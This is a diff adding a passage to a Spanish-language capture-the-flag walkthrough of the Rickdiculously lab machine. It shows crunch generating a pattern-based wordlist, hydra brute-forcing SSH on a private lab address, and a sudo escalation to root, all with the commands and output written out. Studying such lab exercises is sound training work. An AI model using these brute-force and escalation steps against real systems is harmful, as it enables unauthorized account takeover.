@@ -317,7 +317,111 @@ FLAG: {131333} - 20 Points
 
 <img src="https://github.com/El-Palomo/Rickdiculously/blob/main/rick13.jpg" width=80% />
 
-- 
+- Encontramos una contraseña: 131333, asociada al usuario Rick y un archivo llamado SAFE, asi que vamos a analizar su carpeta /home.
+- Copiamos el archivo SAFE a un directorio donde podamos ejecutarlo. Lo ejecuamos y nos piden una contraseña como argumento.
+
+```
+[Summer@localhost Morty]$ cd /home/RickSanchez/
+[Summer@localhost RickSanchez]$ ls
+RICKS_SAFE  ThisDoesntContainAnyFlags
+[Summer@localhost RickSanchez]$ cd RICKS_SAFE/
+[Summer@localhost RICKS_SAFE]$ ls
+safe
+[Summer@localhost RICKS_SAFE]$ ./safe
+-bash: ./safe: Permission denied
+[Summer@localhost RICKS_SAFE]$ cp safe /tmp/
+```
+
+<img src="https://github.com/El-Palomo/Rickdiculously/blob/main/rick14.jpg" width=80% />
+
+
+### 4.3. Cracking ONLINE
+
+- El mensaje indica que la contraseña del usuario RICKS tiene una estructura: 1 Mayúscula + 1 numéro + Una palabra de banda antigua.
+- ¿Banda antigua? Se me vino a la mente algo como U2 pero luego noté que las imagenes estan asociadas a una serie llamada Rick and Morty (que nunca he visto) pero tocaba buscarlo en Google. La banda se llamaba Flesh Curtains.
+
+<img src="https://github.com/El-Palomo/Rickdiculously/blob/main/rick15.jpg" width=80% />
+
+- Toca armar un pequeño script para armar todas las posibles contraseñas. Con CRUNCH podemos crear la contraseña en base a patrones.
+- Con CRUNCH el comodin coma (,) ingresa un caracter en mayúscula y el comodin porcentaje (%) ingresa un número.
+
+
+```
+┌──(root💀kali)-[/home/kali]
+└─# crunch 7 7 -t ,%Flesh > diccionario1.txt     
+Crunch will now generate the following amount of data: 2080 bytes
+0 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 260 
+                                                                                                                                           
+┌──(root💀kali)-[/home/kali]
+└─# crunch 10 10 -t ,%Curtains > diccionario2.txt
+Crunch will now generate the following amount of data: 2860 bytes
+0 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 260
+```
+
+<img src="https://github.com/El-Palomo/Rickdiculously/blob/main/rick16.jpg" width=80% />
+
+```
+┌──(root💀kali)-[/home/kali]
+└─# hydra -t 4 -l RickSanchez -P diccionario2.txt ssh://192.168.56.106:22222
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-28 23:47:32
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 260 login tries (l:1/p:260), ~65 tries per task
+[DATA] attacking ssh://192.168.56.106:22222/
+[STATUS] 44.00 tries/min, 44 tries in 00:01h, 216 to do in 00:05h, 4 active
+[STATUS] 33.67 tries/min, 101 tries in 00:03h, 159 to do in 00:05h, 4 active
+[22222][ssh] host: 192.168.56.106   login: RickSanchez   password: P7Curtains
+1 of 1 target successfully completed, 1 valid password found
+```
+
+<img src="https://github.com/El-Palomo/Rickdiculously/blob/main/rick17.jpg" width=80% />
+
+
+```
+┌──(root💀kali)-[/home/kali]
+└─# ssh -p 22222 RickSanchez@192.168.56.106
+RickSanchez@192.168.56.106's password: 
+Last failed login: Thu Apr 29 04:09:42 AEST 2021 from 192.168.56.104 on ssh:notty
+There were 4950 failed login attempts since the last successful login.
+Last login: Thu Sep 21 09:45:24 2017
+[RickSanchez@localhost ~]$ ls -la
+total 12
+drwxr-xr-x. 4 RickSanchez RickSanchez 113 Sep 21  2017 .
+drwxr-xr-x. 5 root        root         52 Aug 18  2017 ..
+-rw-r--r--. 1 RickSanchez RickSanchez  18 May 30  2017 .bash_logout
+-rw-r--r--. 1 RickSanchez RickSanchez 193 May 30  2017 .bash_profile
+-rw-r--r--. 1 RickSanchez RickSanchez 231 May 30  2017 .bashrc
+drwxr-xr-x. 2 RickSanchez RickSanchez  18 Sep 21  2017 RICKS_SAFE
+drwxrwxr-x. 2 RickSanchez RickSanchez  26 Aug 18  2017 ThisDoesntContainAnyFlags
+[RickSanchez@localhost ~]$ sudo -l
+[sudo] password for RickSanchez: 
+Matching Defaults entries for RickSanchez on localhost:
+    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG
+    LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User RickSanchez may run the following commands on localhost:
+    (ALL) ALL
+[RickSanchez@localhost ~]$ sudo su
+[root@localhost RickSanchez]# pwd
+/home/RickSanchez
+```
+<img src="https://github.com/El-Palomo/Rickdiculously/blob/main/rick18.jpg" width=80% />
+
+
+
+
+
 
 
 
